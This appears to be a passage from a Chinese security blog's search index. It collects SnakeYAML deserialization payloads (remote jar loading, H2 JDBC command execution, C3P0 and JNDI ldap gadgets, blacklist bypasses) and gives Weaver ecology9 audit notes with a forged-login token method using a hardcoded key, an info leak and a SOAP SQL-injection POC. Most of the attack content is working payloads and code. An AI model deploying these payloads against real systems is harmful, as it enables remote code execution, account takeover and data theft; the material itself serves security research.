sink.makeClassInitializer();        static_block.setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;);        return sink.toBytecode();    &#125;&#125;\n\n小结1、找可以利用的构造函数\n2、可以通过&amp; * 引用的方式转换数据格式\nMarshalOutputStream写Jar包+SPIyaml用的jar包可以由这个工具生成：GitHub - artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads\n先写文件\n!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [&quot;success.jar&quot;],false],!!java.util.zip.Inflater &#123; input: !!binary eJxLLE5JTCkGAAh5AnE= &#125;,1048576]]\n\n再spi触发\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:///SnakeYaml/success.jar&quot;]]]]\n\n代码：\npublic class Marshal &#123;    public static void main(String[] args) throws IOException &#123;        marshal(&quot;./poc/yaml-payload.jar&quot;, &quot;success.jar&quot;);        spi();    &#125;    public static void spi() throws IOException &#123;        Yaml yaml = new Yaml();        String spi = &quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\&quot;file:///D:/BaiduSyncdisk/code/MyJavaSecStudy/SnakeYaml/success.jar\\&quot;]]]]&quot;;        yaml.load(spi);    &#125;    public static void marshal(String filePath, String fileName) throws IOException &#123;        byte[] bytes = Files.readAllBytes(Paths.get(filePath));        byte[] bytes_zip = deflateZip(bytes);        String file = Base64.getEncoder().encodeToString(bytes_zip);        String marshal = &quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\\&quot;&quot;+fileName+&quot;\\&quot;],false],&quot; +                &quot;!!java.util.zip.Inflater &#123; input: !!binary &quot; + file + &quot;&#125;,1048576]]&quot;;        Yaml yaml = new Yaml();        yaml.load(marshal);    &#125;    public static byte[] deflateZip(byte[] input)&#123;        Deflater deflater = new Deflater();        deflater.setInput(input);        deflater.finish();        ByteArrayOutputStream baos = new ByteArrayOutputStream();        byte[] buf = new byte[4096];        while (!deflater.finished()) &#123;            int len = deflater.deflate(buf);            baos.write(buf, 0, len);        &#125;        deflater.end();        return baos.toByteArray();    &#125;&#125;\n\n简要分析具体的构造方法自己看一下。这里主要讲在哪里触发文件写入的。\nMarshal的构造方法，这里面out是InflaterOutputStream：\n\n下面是完整调用过程\n\n小结1、java.io.ObjectOutputStream#ObjectOutputStream(java.io.OutputStream)能触发out.write，有可能可以写文件\nMarshal+ClassPathXmlApplicationContextjdk8只支持spring-boot-starter-web 2.xx版本，3版本必须用jdk17\nexp先通过Marsal写xml：\n!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [&quot;success.jar&quot;],false],!!java.util.zip.Inflater &#123; input: !!binary eJxLLE5JTCkGAAh5AnE= &#125;,1048576]]\n\n再加载xml:\n!!org.springframework.context.support.ClassPathXmlApplicationContext [ &quot;http://example.com/spring.xml&quot; ]\n\nxml格式：可以用java-chains生成\n\n&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;decoder&quot; class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt;        &lt;property name=&quot;staticMethod&quot; value=&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;/&gt;        &lt;property name=&quot;arguments&quot;&gt;            &lt;list&gt;                &lt;value&gt;yv66vgAAADIAQAEAaW9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2pzb25Gb3JtYXRWaXNpdG9ycy9Kc29uSW50ZWdlckZvcm1hdFZpc2l0b3IyYTEzOGQ4MmU3MjQ0OWMzYTU3Y2NjMzYzYTMyMTcwYgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=&lt;/value&gt;            &lt;/list&gt;        &lt;/property&gt;    &lt;/bean&gt;    &lt;bean id=&quot;classLoader&quot; class=&quot;javax.management.loading.MLet&quot;/&gt;    &lt;bean id=&quot;clazz&quot; factory-bean=&quot;classLoader&quot; factory-method=&quot;defineClass&quot;&gt;        &lt;constructor-arg ref=&quot;decoder&quot;/&gt;        &lt;constructor-arg type=&quot;int&quot; value=&quot;0&quot;/&gt;        &lt;constructor-arg type=&quot;int&quot; value=&quot;914&quot;/&gt;    &lt;/bean&gt;    &lt;bean factory-bean=&quot;clazz&quot; factory-method=&quot;newInstance&quot;/&gt;&lt;/beans&gt;\n\n简要分析这个也是两步，写文件，本地读文件，ClassXml那个类的构造方法为什么能触发可以自行学习一下。\nH2exp\n\n2.1及以上版本只支持jdk17，且使用的是五个参数的构造函数，exp：\n!!org.h2.jdbc.JdbcConnection [ &quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException &#123; Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;)\\\\; &#125;$$\\\\;CALL EXEC ()\\\\;&quot;, &#123;&#125;, &quot;a&quot;, &quot;b&quot;, false ]\n\n2.0及以下版本，支持jdk8，但只有2.0可打，且使用的是四个参数的构造函数，其exp：\n!!org.h2.jdbc.JdbcConnection [ &quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException &#123; Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;)\\\\; &#125;$$\\\\;CALL EXEC ()\\\\;&quot;, &#123;&#125;, &quot;a&quot;, &quot;b&quot;]\n\n1.9版本没法打，因为其org.h2.jdbcx.JdbcDataSource#getConnection()，没有触发构造方法。\n上面的yaml也可以分行写：\n!!org.h2.jdbc.JdbcConnection- jdbc:h2:mem:test- MODE: MSSQLServer  INIT: |    drop alias if exists exec;    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc.exe&quot;);&#125;$$;    CALL EXEC ();- a- b- false\n\nurl中的xxx&#x3D;xxx其实就是properties的形式，可以写到构造函数的第二个参数里\nProperties写成一行的话就是{MODE: MSSQLServer, INIT: …}\nINIT后面的 | ，表示多行文本块。\nspringboot回显exp：\n!!org.h2.jdbc.JdbcConnection- jdbc:h2:mem:test- MODE: MSSQLServer  INIT: |    DROP ALIAS IF EXISTS EXEC;    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;org.springframework.util.StreamUtils.copy(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream(),((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()).getResponse().getOutputStream());&#125;$$;    CALL EXEC ();- a- b- false\n\n简要分析这里主要是H2SQL打JDBC\nJDBC-Attack 攻击利用汇总-先知社区\nC3P0二次反序列化可以出网也可以不出网。还是推荐用Java-chain工具生成。\nexp这个是TemplatesImpl加载字节码执行calc的\n!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource  userOverridesAsString: &quot;HexAsciiSerializedMap:aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372002a6a6176612e6c616e672e537472696e672443617365496e73656e736974697665436f6d70617261746f7277035c7d5c50e5ce02000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000003b3cafebabe0000003200420100446f72672f6170616368652f736869726f2f636f796f74652f4f626a6563745265616465723839656130316663313231623435316562333435643937303234353266633031070001010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c6574070003010004626173650100124c6a6176612f6c616e672f537472696e673b010003736570010003636d640100063c696e69743e0100032829560100136a6176612f6c616e672f457863657074696f6e07000b0c0009000a0a0004000d0100076f732e6e616d6508000f0100106a6176612f6c616e672f53797374656d07001101000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0c001300140a001200150100106a6176612f6c616e672f537472696e6707001701000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b0c0019001a0a0018001b01000377696e08001d010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0c001f00200a00180021010007636d642e6578650800230c0005000609000200250100022f630800270c0007000609000200290100072f62696e2f736808002b0100022d6308002d0c00080006090002002f0100186a6176612f6c616e672f50726f636573734275696c646572070031010016285b4c6a6176612f6c616e672f537472696e673b29560c000900330a00320034010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0c003600370a003200380100106a6176612f6c616e672f4f626a65637407003a0100083c636c696e69743e01000463616c6308003d0a0002000d010004436f646501000d537461636b4d61705461626c6500210002000400000003000900050006000000090007000600000009000800060000000200010009000a000100400000008400040002000000532ab7000e1210b80016b6001c121eb600229900101224b300261228b3002aa7000d122cb30026122eb3002a06bd00185903b20026535904b2002a535905b20030534cbb0032592bb70035b6003957a700044cb100010004004e0051000c00010041000000170004ff002100010700020000096507000cfc000007003b0008003c000a000100400000001a000200000000000e123eb30030bb000259b7003f57b10000000000007074002431666639653232642d663032362d346461382d626363622d666362363936616265636534707701007871007e000d78;&quot;\n\n\n\n\n\n\n\n出网这里大多是一些常规JNDI打法。能不能用需要判断一下jdk版本有没有限制JNDI反序列化，有没有模块化机制，能不能绕过。\nJdbcRowSetImpl!!com.sun.rowset.JdbcRowSetImpldataSourceName: &quot;ldap://127.0.0.1:50389/8ebd8d&quot;autoCommit: true\n\nDns&#123;!!java.net.URL [&quot;http://321213.n4s0yv3nfxrbbvlddamiykomhdn4buzj.oastify.com/&quot;]: 1&#125;\n\n这里的{URL: 1}，是为了让SnakeYaml解析成Map的形式，这样才会触发key.hashCode()的逻辑。\nSpiLoadJar最经典的\n!!javax.script.ScriptEngineManager- !!java.net.URLClassLoader  - - !!java.net.URL [&quot;http://127.0.0.1:8888/success.jar&quot;]!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL [&quot;http://127.0.0.1:8888/success.jar&quot;]  ]]]\n\nSimpleJndiBeanFactory需要spring-bean依赖，一般spring自带。\n!!org.springframework.beans.factory.config.PropertyPathFactoryBean &#123;targetBeanName: &quot;ldap://127.0.0.1:50389/8ebd8d&quot;, propertyPath: &quot;xxxx&quot;, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;shareableResources: [&quot;ldap://127.0.0.1:50389/8ebd8d&quot;]&#125;&#125;!!org.springframework.beans.factory.config.PropertyPathFactoryBeantargetBeanName: ldap://127.0.0.1:50389/8ebd8dpropertyPath: xxxbeanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory  shareableResources: [&quot;ldap://127.0.0.1:50389/8ebd8d&quot;]!!org.springframework.beans.factory.config.PropertyPathFactoryBeantargetBeanName: ldap://127.0.0.1:50389/8ebd8dpropertyPath: xxxbeanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory  shareableResources:    - ldap://127.0.0.1:50389/8ebd8d\n\nC3p0Jndiexp!!com.mchange.v2.c3p0.JndiRefForwardingDataSourcejndiName: &quot;ldap://127.0.0.1:50389/8ebd8d&quot;loginTimeout: 1\n\nXBeanexp!!javax.management.BadAttributeValueExpException- !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding  - &quot;baka&quot;  - !!javax.naming.Reference    - &quot;any&quot;    - &quot;CalcAbs&quot;    - &quot;http://127.0.0.1:7778/&quot;  - !!org.apache.xbean.naming.context.WritableContext []\n\n这里是直接从远程加载.class文件，Reference的第二个参数是.class文件的类名，如果有包名前面要写包名。url最后的斜杠不能少。\n注意，这个最后走的是Codebase加载字节码，这个跟rmi一样，8u121就被禁了，实用性比较低。\n\nCommons-Configurationexp? !!org.apache.commons.configuration.ConfigurationMap- !!org.apache.commons.configuration.JNDIConfiguration   - !!javax.naming.InitialContext []   - &quot;ldap://127.0.0.1:50389/8ebd8d&quot;: 1\n\n多行时，不支持直接把一个复杂类作为键，需要用?表示键的开始。\n!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://127.0.0.1:50389/8ebd8d&quot;]] : 1\n\n依赖探测exp# 前面的类存在，后面才会有dns解析记录&#123;!!org.apache.commons.configuration.JNDIConfiguration &#123;&#125;: 0, !!java.net.URL [&quot;http://JNDIConfiguration.sxt5r0ws82kg40ei6ffnrphraig942sr.oastify.com&quot;]: 1&#125;\n\n这里要求被探测的类有无参构造或者是一个接口，不然会因为没有合适的构造方法而报错。\nWAF绕过!!绕过!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt;//!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n\n黑名单绕过%TAG !a! tag:yaml.org,2002:javax.script.ScriptEng%TAG !b! tag:yaml.org,2002:java.net.URLClassL%TAG !c! tag:yaml.org,2002:java.net.U---!a!ineManager [  !b!oader [[    !c!RL [&quot;http://127.0.0.1:7777/yaml-payload.jar&quot;]  ]]]\n\n原理：\n\n%TAG 指令：YAML 允许通过 %TAG 指令定义自定义标签前缀。\n\n映射关系：\n\n!a! 映射到 tag:yaml.org,2002:javax.script.ScriptEng\n\n!b! 映射到 tag:yaml.org,2002:java.net.URLClassL\n\n!c! 映射到 tag:yaml.org,2002:java.net.U\n\n\n小结SnakeYaml利用要关注构造方法，能通过构造方法触发的链子，都可以尝试迁移到SnakeYaml。\n同时也要关注字段为private或protected或static，且其setter只有一个参数的public setter方法。\n\n这个public不能进，进去了就变成FieldProperty了，那到时候调用property.set时就不会调用invoke。\nsetter不是public的话，会在这里抛出：\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Yaml文件写法总结","url":"/2025/08/04/Yaml%E6%96%87%E4%BB%B6%E5%86%99%E6%B3%95%E6%80%BB%E7%BB%93/","content":"前言yaml写法很灵活，尤其是多行写法，看起来很简洁。这里总结一下遇到的一些yaml写法，希望能对之后payload的编写有帮助。\nMap类型数据Properties，HashMap这种都属于Map类型，先看下面的例子：\n!!org.h2.jdbc.JdbcConnection- jdbc:h2:mem:test- MODE: MSSQLServer  INIT: |    drop alias if exists exec;    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc.exe&quot;);&#125;$$;    CALL EXEC ();- a- b- false\n\nJdbcConnection的构造方法如下：JdbcConnection(String url, Properties info, String user, Object password, boolean forbidCreation)\n第二个参数就是Properties。其多行写法如上。\n对应的单行写法为：!!xxx[{MODE: xxx, INIT: xxx\\;xxx\\;xxx}]，不如多行清楚。\n键值对写法单行&#123;!!xx &#123;&#125; : 0, !!cc &#123;&#125; : 1&#125;\n\n多行!!xx &#123;&#125; : 0!!cc &#123;&#125; : 1\n\n当键为多行复杂类时，需要用?表示键开始：\n? !!org.apache.commons.configuration.ConfigurationMap- !!org.apache.commons.configuration.JNDIConfiguration   - !!javax.naming.InitialContext []   - &quot;ldap://127.0.0.1:50389/8ebd8d&quot;: 1\n\n| 的含义还是上面的例子：\n!!org.h2.jdbc.JdbcConnection- jdbc:h2:mem:test- MODE: MSSQLServer  INIT: |    drop alias if exists exec;    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc.exe&quot;);&#125;$$;    CALL EXEC ();- a- b- false\n\nINIT后面的 | 是干什么的？\n这个代表多行文本块，就是把后面的内容都视为一个整体。这样写看起来会更清晰。\n调构造方法多行时，- 后代表构造函数参数；单号时[]内代表参数\n多行还是上面的例子：\n!!org.h2.jdbc.JdbcConnection- jdbc:h2:mem:test- MODE: MSSQLServer  INIT: |    drop alias if exists exec;    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc.exe&quot;);&#125;$$;    CALL EXEC ();- a- b- false\n\n单行!!org.h2.jdbc.JdbcConnection[“jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;dropaliasifexistsexec\\;CREATEALIASEXECAS$$voidexec()throwsjava.io.IOException{Runtime.getRuntime().exec(&quot;calc.exe&quot;)\\;}$$\\;CALLEXEC()\\;”,{},”a”,”b”,false]\nsetter调用多行!!com.sun.rowset.JdbcRowSetImpldataSourceName: ldap://127.0.0.1:50389/8ebd8dautoCommit: true\n\n单行!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:50389/8ebd8d, autoCommit: true&#125;\n\n引用类型yaml中，可以使用&amp;表示创建引用，* 表示调用引用。这个方法有时候能帮助做一下类型转换。以SnakeYaml中JDK原生链为例子：\n[  !!com.sun.javafx.iio.ImageFrame [null, null, 0, 0, 0, &amp;A [!!binary &quot;yv66vgAAADQAGQEABFNpbmsHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQARamF2YS9sYW5nL1J1bnRpbWUHAAgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAKAAsKAAkADAEABGNhbGMIAA4BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAQABEKAAkAEgEABjxpbml0PgwAFAAGCgAEABUBAApTb3VyY2VGaWxlAQAJU2luay5qYXZhACEAAgAEAAAAAAACAAgABQAGAAEABwAAABYAAgAAAAAACrgADRIPtgATV7EAAAAAAAEAFAAGAAEABwAAABEAAQABAAAABSq3ABaxAAAAAAABABcAAAACABg=&quot;], null],  !!com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter [    !!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl [*A,&quot;baka&quot;,!!java.util.Properties &#123;&#125;,!!int 0,!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl &#123;&#125;]  ]]\n\n在上面创建&amp;A，表示对[!!binary]的引用。由于上面的构造函数中，&amp;A所在位置对应的数据类型就是byte[][]，所以会从ArrayList被转换为byte[][]。原本[!!binary]在snakeyaml反序列化后，类型为ArrayList，是无法进入TemplatesImpl的构造方法的。\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"泛微ecology9环境搭建","url":"/2025/08/10/%E6%B3%9B%E5%BE%AEecology9%E5%89%8D%E7%BD%AE/","content":"泛微ecology9(下文简称e9)是我接触的第一个比较大型的复杂项目，一开始审计时花了很大力气。主要难点是：url和类的映射关系是什么；鉴权逻辑是怎么样的；各种filter是如何工作，有什么作用；安全补丁包怎么发挥作用；怎么找漏洞修复后的代码……\n总之问题非常多，再加上泛微e9的代码十分混乱，像是把十几年的技术全塞一起了，分析调试的过程十分艰难。\n最后我决定不死磕每一个点，就把漏洞原理看懂就行，不追求调试一遍，也不追求一下子把复杂的路由映射和鉴权逻辑看懂。\n在这里记录一下我认为比较重要的知识，希望对新人有一点帮助。\n环境搭建我这里的版本是9.00.2303.02，在某鱼上收的。搭建环境是Windows+mysql8.0.20\n这里mysql数据库一定要用mysql8.0.20，用其他的版本在数据库初始化的时候会报错。数据库一定要修改配置文件。\n\n数据库初始化很久，需要多等一会儿。\n调试配置的话，需要把classbean和各种lib加入idea项目结构的库中。\n需要加入的包括：\\ecology\\WEB-INF\\myclasses；\\ecology\\classbean；\\Resin\\lib；\\ecology\\WEB-INF\\classes；\\ecology\\WEB-INF\\lib；还有其他lib：\n如果发现idea识别不了哪个jar包，就单独添加一下。\n路由映射这里主要讲一下url和具体文件的映射关系。\njsp文件的话，url和文件路径是一样的，比如\\ecology\\security\\monitor\\Monitor.jsp，对应的url就是http://127.0.0.1:8090/security/monitor/isRaspRun.jsp\n&#x2F;api&#x2F;… 这类url，对应的是&#x2F;classbean&#x2F;com&#x2F;api，也有说对应&#x2F;classbean&#x2F;com&#x2F;engine的，还不确定：\n\n&#x2F;service&#x2F;xxx 这类url对应：&#x2F;classbean&#x2F;weaver&#x2F;xxx&#x2F;xxxImpl\n&#x2F;weaver&#x2F;com.xxx.xxx这类对应：&#x2F;classbean&#x2F;com&#x2F;xxx&#x2F;xxx，相当于直接对应包名了。\n开发文档https://e-cloudstore.com/doc.html?appId=84e77d7890a14c439590b37707251859\nhttps://e-cloudstore.com/ec/api/applist/index.html#/\nhttps://e-cloudstore.com/e9/file/E9BackendDdevelopmentGuide.pdf\n安全补丁分析安全补丁主要看\\ecology\\WEB-INF\\myclasses\\weaver\\security\\rules\\ruleImp，这里面的.class文件是主要的过滤逻辑。\n同时，很多时候安全补丁会直接把漏洞路径给写出来：\n\n这里的漏洞路径就是&#x2F;mobile&#x2F;plugin&#x2F;1&#x2F;ofslogin.jsp\n安全开关在\\ecology\\WEB-INF\\weaver_security_config.xml中，把1 改成0即可\nhttp://127.0.0.1:8090/security/monitor/Monitor.jsp\n可以到这里查看安全补丁和开关情况。\n安全补丁调用栈\n在weaver.security.core.SecurityCore#executeCustomRulesForStaticResource进行调用，里面的\ncleanRuleClasses和cleanRuleObjMap加载了安全规则和自定义安全规则，就是补丁里的主要内容\n配置文件目录在\\ecology\\WEB-INF\\prop，一般通过Prop.getPropValue(“fileName”, “key”)读取\n比较典型的就是ofsLogin任意用户登录\n\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"泛微ecology9_changeUserInfo信息泄露+ofsLogin任意用户登录","url":"/2025/08/10/changeUserInfo%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-ofsLogin%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/","content":"补丁文件是这两个：SecurityRuleOfcLogin.class，SecurityRuelForMobileChangeInfo.class，位置：\\ecology\\WEB-INF\\myclasses\\weaver\\security\\rules\\ruleImp\nofsLogin.jsp任意用户登录\n由补丁得知漏洞路由&#x2F;mobile&#x2F;plugin&#x2F;1&#x2F;ofsLogin.jsp\n看一下jsp逻辑：\n将传入的token和计算的token比较，相同的话才鉴权通过：\n\n默认规则是通过loginid进行登录。注意，这里syscode必须是IM，因为表中默认值为IM。但是理论上写任意的也是查询到空，但是这里就是不行，不知道为什么：\n\n\nHrmResource表：\n\n默认是空的，需要自行创建：\n\ngopage参数就是重定向，成功登录后会进行跳转，写成wui&#x2F;index.html就能跳转到首页，不写也没事：\n\n那现在的目标就是想办法让token相同了。\n处理最后一个参数，其他我们都可控：\n\n但是最后一个参数也是硬编码在配置文件里的，所以我们能够知道\\ecology\\WEB-INF\\prop\\transferE9.properties\n\n于是可以得出token：\npublic static void main(String[] args) throws Exception &#123;    String loginid = &quot;baka&quot;;    String receiver = loginid;    String timestamp = &quot;1&quot;;    String syscode = &quot;IM&quot;;    String secretKey = &quot;u6skkR&quot;;    String loginTokenFromThird = AESCoder.encrypt(receiver+timestamp, syscode+secretKey);    System.out.println(loginTokenFromThird);&#125;\n\n但是我们的loginid哪里来？\n这里就要用另一个信息泄露漏洞。\nchangeUserinfo.jsp仍然能在漏洞补丁中找到路由：&#x2F;mobile&#x2F;plugin&#x2F;changeUserInfo.jsp\n\n找到对应jsp文件，看一下是怎么信息泄露的\n传入的参数有：\n\n先看type&#x3D;getLoginid：\n\n对mobile进行一个模糊查询，当mobile唯一时，直接返回对应的loginid，不唯一时返回0，不存在时返回-1\n\n\n当type&#x3D;getUserid时：\n\n会根据我们传入的loginId是否存在给出不同回显，具体逻辑在hr.getUserId：\n\n能找到就返回对应的Id，否则返回0，能用来爆破\n\n再看type&#x3D;status时：\n\n也是根据loginId是否存在给出不一样的值，不过这里只有没修改过密码的loginId才会返回21，其他都是返回-1\n\n小结其实我是有这两个补丁类的，但是不知道为什么没有生效，可能是因为我把安全设置关了？后面发现缺少，把安全设置关了就被拦截了，具体怎么关可以看我写的泛微ecology9前置。\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"泛微ecology9_SQL注入漏洞整理","url":"/2025/08/10/%E6%B3%9B%E5%BE%AESQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/","content":"前言不能调试的就过，主要是明白漏洞原理，知道泛微里的注入大概是个什么形式就行。\n&#x2F;service&#x2F;BlogService这里路由的形式是WebService，所以需要了解一下WebService以及这里配套的SOAP协议和WSDL文档。\n不过这里还是先给出poc，简单看一下：\nPOST /services/BlogService HTTP/1.1Host: 127.0.0.1:8090Cache-Control: max-age=0sec-ch-ua: &quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8090/Accept-Encoding: gzip, deflate, brCookie: ecology_JSessionid=aaaTFu27tf_OB7M3KLrIz; JSESSIONID=aaaTFu27tf_OB7M3KLrIz; __randcode__=a5cddb6a-5dc6-4cab-a850-d79303048e8fIf-None-Match: &quot;6VlXQDoaXNs&quot;If-Modified-Since: Fri, 08 Aug 2025 01:39:01 GMTConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 347&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:web=&quot;webservices.blog.weaver.com.cn&quot;&gt;   &lt;soapenv:Header/&gt;   &lt;soapenv:Body&gt;      &lt;web:writeBlogReadFlag&gt;     &lt;in0&gt;-1 union select 1,2,sleep(3)#&lt;/in0&gt;\t\t &lt;in1&gt;&lt;/in1&gt;\t\t &lt;in2&gt;&lt;/in2&gt;      &lt;/web:writeBlogReadFlag&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\nWebServiceWebService可以理解为专门对外提供服务的一个入口，它的作用是通过标准化的协议(SOAP，REST)来暴露业务功能，能够使外部应用或程序进行远程调用。如果学过RMI或者Hessian的话，应该会觉得比较熟悉，因为这实际上也是一种RPC远程方法调用。这三者都是远程调用机制，都可传递复杂对象，客户端和服务端都有接口协议。\nSOAP协议SOAP协议一般用于WebService，是一种XML格式的协议，即通过xml来描述需要调用的方法和传递的参数。\nSOAP协议的三部分：\n&lt;soap:Envelope&gt;     &lt;!-- 信封，声明这是SOAP消息 --&gt;  &lt;soap:Header&gt;     &lt;!-- 可选，存放认证、路由等元数据 --&gt;  &lt;/soap:Header&gt;  &lt;soap:Body&gt;       &lt;!-- 